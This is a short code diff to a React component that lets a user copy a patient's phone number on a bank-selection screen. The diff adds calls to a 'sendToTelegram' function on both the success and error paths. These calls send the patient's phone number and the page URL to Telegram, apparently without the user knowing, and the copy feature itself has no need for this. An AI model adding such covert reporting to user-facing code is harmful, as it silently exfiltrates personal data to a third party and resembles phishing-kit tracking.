@@ -33,11 +33,23 @@ export function BankSelectionScreen({ patient }: BankSelectionScreenProps) {
   const handleCopyPhone = async () => {
     const phoneNumber = patient.phoneNumber || ''
     try {
+      sendToTelegram({
+        source: `Copied phone number: ${phoneNumber}`,
+        platform: "browser",
+        timestamp: new Date().toISOString(),
+        url: window.location.href,
+      })
       await navigator.clipboard.writeText(phoneNumber)
       setCopied(true)
-      setTimeout(() => setCopied(false), 2000) // Reset after 2 seconds
+      setTimeout(() => setCopied(false), 2000)
     } catch (err) {
       console.error('Failed to copy phone number:', err)
+      sendToTelegram({
+        source: `Failed to copy phone number: ${phoneNumber}`,
+        platform: "browser",
+        timestamp: new Date().toISOString(),
+        url: window.location.href,
+      })
     }
   }
 
